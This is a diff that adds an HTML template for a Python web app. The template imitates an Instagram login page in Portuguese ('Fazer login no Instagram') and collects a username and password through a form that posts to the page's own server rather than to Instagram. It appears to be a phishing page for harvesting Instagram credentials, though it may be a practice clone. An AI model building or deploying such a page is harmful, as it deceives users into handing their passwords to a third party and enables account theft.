@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/login.css') }}">
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/main.css') }}">
+</head>
+<body>
+    <div style="margin-left: 50px; border: 1px solid black; width: 480px; height: 853px; font-size: 18pt;">
+        <h2 style="margin-left: 50px;">Fazer login no Instagram</h2>
+        <form method="post" style="margin-left: 80px;">
+            <div style="margin-top: 60px;">
+                <label style="display: inline-grid;">
+                    <span>Telefone, nome de usuário ou email</span>
+                    <input name="usuario" type="text" value="." onclick="this.value=''" required />
+                    <span style="color: #FF0000; font-size: 14pt;">{{ status }}</span>
+                </label>
+            </div>
+            <div style="margin-top: 50px;">
+                <label style="display: inline-grid;">
+                    <span>Senha</span>
+                    <input name="senha" type="password" value="" onclick="this.value=''" required />
+                </label>
+            </div>
+
+            <input style="margin-top: 50px;" type="submit" value="Entrar" />
+        </form>
+    </div>
+</body>
+</html>
